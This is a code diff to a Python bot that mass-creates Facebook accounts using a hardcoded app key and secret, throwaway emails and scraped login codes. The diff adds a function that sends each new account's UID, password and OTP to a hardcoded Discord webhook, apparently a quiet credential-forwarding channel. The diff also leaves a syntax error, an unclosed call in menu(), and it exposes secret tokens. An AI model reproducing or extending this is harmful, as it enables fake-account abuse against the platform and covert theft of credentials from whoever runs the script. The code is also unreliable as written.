@@ -860,9 +860,26 @@ def menu():
         else:
             first_name = manual_first
             last_name = manual_last
-        register_facebook_account(password, first_name, last_name, birthday)
+        register_facebook_account(password, first_name, last_name, birthday
+
+account_count = 0
+
+def send_to_discord(webhook_url, uid, password, otp, account_counter):
+    import requests
+    data = {
+        "content": f"{uid}:{password} - {otp} - {account_counter}"
+    }
+    try:
+        response = requests.post(webhook_url, json=data)
+        if response.status_code == 204:
+            print("[✔] Sent to Discord!")
+        else:
+            print(f"[✖] Failed to send to Discord ({response.status_code})")
+    except Exception as e:
+        print(f"[!] Discord Error: {e}")
 
 def register_facebook_account(password, first_name, last_name, birthday):
+    global account_count
     session = requests.Session()
     api_key = '882a8490361da98702bf97a021ddc14d'
     secret = '62f8ce9f74b12f84c123cc23437a4a32'
@@ -871,22 +888,22 @@ def register_facebook_account(password, first_name, last_name, birthday):
     email = em['mail']
     number = get_nope()
     req = {
-        'api_key': api_key, 
-        'attempt_login': True, 
-        'birthday': birthday.strftime('%Y-%m-%d'), 
-        'client_country_code': 'US', 
-        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod', 
-        'fb_api_req_friendly_name': 'registerAccount', 
-        'firstname': first_name, 
+        'api_key': api_key,
+        'attempt_login': True,
+        'birthday': birthday.strftime('%Y-%m-%d'),
+        'client_country_code': 'US',
+        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod',
+        'fb_api_req_friendly_name': 'registerAccount',
+        'firstname': first_name,
         'format': 'json',
-        'gender': gender, 
-        'lastname': last_name, 
-        'email': email, 
-        'number': number, 
-        'locale': 'en_US', 
-        'method': 'user.register', 
-        'password': password, 
-        'reg_instance': generate_random_string(32), 
+        'gender': gender,
+        'lastname': last_name,
+        'email': email,
+        'number': number,
+        'locale': 'en_US',
+        'method': 'user.register',
+        'password': password,
+        'reg_instance': generate_random_string(32),
         'return_multiple_errors': True
     }
     sorted_req = sorted(req.items(), key=lambda x: x[0])
@@ -904,7 +921,7 @@ def register_facebook_account(password, first_name, last_name, birthday):
         if 'Locked' in check:
             cps.append(id)
         else:
-            print(Panel(' [bold green]ACCOUNT ACCESSABLE',style="bold violet"))
+            print(Panel(' [bold green]ACCOUNT ACCESSABLE', style="bold violet"))
             time.sleep(30)
             try:
                 cod = Email(em["session"]).inbox()
@@ -913,26 +930,33 @@ def register_facebook_account(password, first_name, last_name, birthday):
                 cod = Email(em["session"]).inbox()
                 code = re.search(r'(\d+)', str(cod['topic'])).group(1)
             if code:
-                a=Tree(":file_folder:",guide_style="bold green_yellow")
+                a = Tree(":file_folder:", guide_style="bold green_yellow")
                 a.add(f"[violet][[yellow2]●[violet]] [bold green]NAME     [cyan2] ⟩ [bold green]{first_name} {last_name}")
                 a.add("[violet][[yellow2]●[violet]] [bold green]EMAIL    [cyan2] ⟩ [bold green]"+email)
                 a.add("[violet][[yellow2]●[violet]] [bold green]NUMBER   [cyan2] ⟩ [bold green]"+number)
                 a.add("[violet][[yellow2]●[violet]] [bold green]LOGIN OTP[cyan2] ⟩ [bold green]"+code)
-                #a.add("[violet][[yellow2]●[violet]] [bold green]PHOTO  [cyan2] ⟩ [bold green]"+photo)
                 print(a)
-                hx=("[bold green]"+token)
-                Bryxa = Panel.fit("[green] LOGIN SUCCESS",style="bold violet")
-                Bryxb = Panel("[green] "+id, title="[bold green]UID",width=30,padding=0,style="bold violet")
-                Bryxc = Panel(f"[bold green] {password}", title="[bold green]PASS",width=30,padding=0,style="bold violet")
+                hx = ("[bold green]"+token)
+                Bryxa = Panel.fit("[green] LOGIN SUCCESS", style="bold violet")
+                Bryxb = Panel("[green] "+id, title="[bold green]UID", width=30, padding=0, style="bold violet")
+                Bryxc = Panel(f"[bold green] {password}", title="[bold green]PASS", width=30, padding=0, style="bold violet")
                 Bryxe = Columns([Bryxa])
                 Bryxf = Columns([Bryxb, Bryxc])
-                c=Tree(":file_folder:",guide_style="bold green_yellow")
+                c = Tree(":file_folder:", guide_style="bold green_yellow")
                 c.add(Bryxe)
                 c.add(Bryxf)
-                c.add(Panel(hx,style="bold violet"))
+                c.add(Panel(hx, style="bold violet"))
                 print(c)
+                account_count += 1
                 oks.append(id)
                 open("/sdcard/AUTO-CREATE-BRYX/create/auto-create-alive.txt", "a").write(id+"|"+code+f"|{password}|"+email+"|"+token+"\n")
+                send_to_discord(
+                    "https://discord.com/api/webhooks/1362730444914819342/GJQ_9di8cIhEVVy61RBbhEkdFwvRPfzLRPJTWZ4e_kCzb7L7N3NZkWxE-XPiRYlOewtD",
+                    id,
+                    password,
+                    code,
+                    account_count
+                )
             else:
                 print()
     else:
